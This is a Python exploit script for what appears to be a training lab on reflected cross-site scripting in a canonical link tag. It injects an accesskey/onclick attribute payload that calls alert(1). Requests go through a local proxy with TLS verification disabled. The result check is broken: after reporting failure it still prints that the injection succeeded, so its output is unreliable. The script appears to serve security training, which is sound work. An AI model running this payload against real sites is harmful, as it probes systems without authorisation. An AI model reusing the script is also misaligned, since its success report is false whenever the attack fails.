import requests
import urllib3
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' :'http://127.0.0.1:8080'}

def xss_attack(url):
    # PREPARE PAYLOAD
    payload = "/?'accesskey='x'onclick='alert(1)'"
    
    # PREPARARE URL
    home_url = url + payload

    # MAKE REQUEST AND INJECT PAYLOAD
    r = requests.get(home_url, verify=False, proxies=proxies)

    # CHECK IF PAYLOAD IS IN THE LINK LOCAL TAG
    if "<link rel=\"canonical\" href='{0}'/>".format(home_url) not in r.text:
        print("[-] Injection failed")
    print("[+] Injection was successful.\n[+] Website is vulnerable to reflected XSS in the canonical link tag")



def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] ### Lab: Reflected XSS in canonical link tag")
    print("""[+] This lab reflects user input in a canonical link tag and escapes angle brackets.
    To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.
    To assist with your exploit, you can assume that the simulated user will press the following key combinations:
    
    - ALT+SHIFT+X
    - CTRL+ALT+X
    - Alt+X
    
    Please note that the intended solution to this lab is only possible in Chrome.""")


    xss_attack(url)


if __name__ == "__main__":
    main()